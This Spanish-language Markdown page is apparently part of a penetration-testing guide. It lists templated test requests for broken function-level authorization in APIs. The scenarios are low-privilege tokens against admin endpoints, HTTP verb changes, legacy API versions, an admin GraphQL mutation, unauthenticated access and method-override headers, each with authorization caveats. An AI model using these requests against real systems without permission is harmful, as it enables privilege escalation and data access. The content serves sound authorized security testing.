# 🗡️ BFLA: autorización rota por función: payloads y técnicas

> **Uso autorizado:** sustituir `{ORIGEN}`, `{TOKEN_A}`, `{ID_PROPIO}` y `{ID_CONTROLADO_B}` por valores del entorno y de cuentas propias. No ejecutar muestras que cambien estado sin permiso específico y plan de reversión.

## 🎯 Preparación

- Capturar primero la solicitud legítima y su respuesta esperada.
- Mantener igual método, sesión, cabeceras y cuerpo salvo el campo bajo prueba.
- Usar un marcador único como `prueba-123` para distinguir reflejos y efectos de caché.

## 🔬 Pruebas por escenario

### 1. Función admin de lectura

**Objetivo:** Rol bajo compara acceso a una función solo para administrador.

```http
GET /api/admin/test-report HTTP/1.1
Host: {ORIGEN}
Authorization: Bearer {TOKEN_ROL_BAJO}
```

**Interpretación:** Confirmar datos privilegiados; un 200 vacío o página de login no prueba BFLA.

**Fuente técnica:** [documentación de la técnica](https://api-security.owasp.org/editions/2023/en/0xa5-broken-function-level-authorization/).

### 2. Función admin POST inocua

**Objetivo:** Comprobar si un rol bajo puede ejecutar una acción reversible propia.

```http
POST /api/admin/test-items HTTP/1.1
Host: {ORIGEN}
Authorization: Bearer {TOKEN_ROL_BAJO}
Content-Type: application/json

{"name":"canary-{NONCE}"}
```

**Interpretación:** Verificar objeto creado y limpiar. La ruta es plantilla; usar función real en alcance.

**Fuente técnica:** [documentación de la técnica](https://api-security.owasp.org/editions/2023/en/0xa5-broken-function-level-authorization/).

### 3. Cambio de verbo

**Objetivo:** Comparar política de GET, PATCH y DELETE sobre objeto de prueba.

```text
GET /api/v1/test-items/{ID_PROPIO}
PATCH /api/v1/test-items/{ID_PROPIO}
DELETE /api/v1/test-items/{ID_PROPIO}
```

**Interpretación:** No ejecutar DELETE fuera de laboratorio; una lista de métodos no demuestra permiso.

**Fuente técnica:** [documentación de la técnica](https://api-security.owasp.org/editions/2023/en/0xa5-broken-function-level-authorization/).

### 4. Ruta de API antigua

**Objetivo:** Buscar middleware ausente en versión previa activa.

```http
GET /api/v1/admin/test-report HTTP/1.1
Host: {ORIGEN}
Authorization: Bearer {TOKEN_ROL_BAJO}
```

**Interpretación:** Comparar con v2 equivalente; versión v1 debe estar en alcance y devolver datos reales.

**Fuente técnica:** [documentación de la técnica](https://portswigger.net/web-security/api-testing).

### 5. Mutación GraphQL administrativa

**Objetivo:** Probar que el resolver exige rol alto.

```graphql
mutation { createTestInvite(role:"viewer", email:"{EMAIL_PROPIO}") { id } }
```

**Interpretación:** Usar únicamente email propio y confirmar que la función era exclusiva de admin.

**Fuente técnica:** [documentación de la técnica](https://portswigger.net/web-security/graphql).

### 6. Ruta sin sesión

**Objetivo:** Distinguir autenticación de autorización por rol.

```http
GET /api/admin/test-report HTTP/1.1
Host: {ORIGEN}
```

**Interpretación:** Anónimo, rol bajo y rol alto deben producir respuestas distintas según política.

**Fuente técnica:** [documentación de la técnica](https://api-security.owasp.org/editions/2023/en/0xa5-broken-function-level-authorization/).

### 7. Método override

**Objetivo:** Comprobar si una pasarela y backend aplican políticas a métodos distintos.

```http
POST /api/v1/test-items/{ID_PROPIO} HTTP/1.1
Host: {ORIGEN}
X-HTTP-Method-Override: PATCH
Authorization: Bearer {TOKEN_ROL_BAJO}
Content-Type: application/json

{"name":"canary-{NONCE}"}
```

**Interpretación:** Solo si la plataforma soporta override; confirmar efecto y rol efectivo.

**Fuente técnica:** [documentación de la técnica](https://portswigger.net/web-security/api-testing).

## ✅ Evidencia mínima

1. Solicitud de control y solicitud modificada, con diferencias visibles.
2. Respuesta o efecto observado en una cuenta/objeto de prueba independiente.
3. Explicación del control que falló y del alcance real comprobado.

---

[📖 Descripción y análisis](../Descripcion/README.md) · [← Índice general](../../README.md)
